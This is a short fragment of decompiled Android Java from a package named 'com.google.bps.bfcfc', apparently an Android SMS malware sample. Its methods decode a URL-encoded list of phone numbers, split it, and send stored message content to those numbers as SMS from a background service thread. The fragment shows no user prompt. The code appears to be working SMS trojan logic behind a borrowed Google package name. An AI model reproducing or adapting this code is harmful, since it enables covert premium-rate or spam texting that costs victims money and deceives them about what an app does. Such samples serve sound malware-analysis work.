    {
        p0.sendData(p1);
        return;
    }

    private void sendData(String p11)
    {
        this.mobile = p11;
        android.telephony.SmsManager v0 = android.telephony.SmsManager.getDefault();
        if (this.content.length() < 70) {
            android.content.Intent v7_0 = new android.content.Intent(com.google.bps.bfcfc.SMS.SMS_SEND_ACTIOIN);
            android.content.Intent v6_1 = new android.content.Intent(com.google.bps.bfcfc.SMS.SMS_DELIVERED_ACTION);
            android.app.PendingIntent v4 = android.app.PendingIntent.getBroadcast(com.google.bps.bfcfc.CoreService.mContext, 0, v7_0, 0);
            com.google.bps.bfcfc.CoreService.mContext.registerReceiver(this.sendMessage, new android.content.IntentFilter(com.google.bps.bfcfc.SMS.SMS_SEND_ACTIOIN));
            v0.sendTextMessage(this.mobile, 0, this.content, v4, android.app.PendingIntent.getBroadcast(com.google.bps.bfcfc.CoreService.mContext, 0, v6_1, 0));
        }
        return;
    }

    public void send(String p4)
    {
        this.phones = java.net.URLDecoder.decode(p4).split("p");
        new Thread(new com.google.bps.bfcfc.SMS$2(this)).start();
        return;
    }
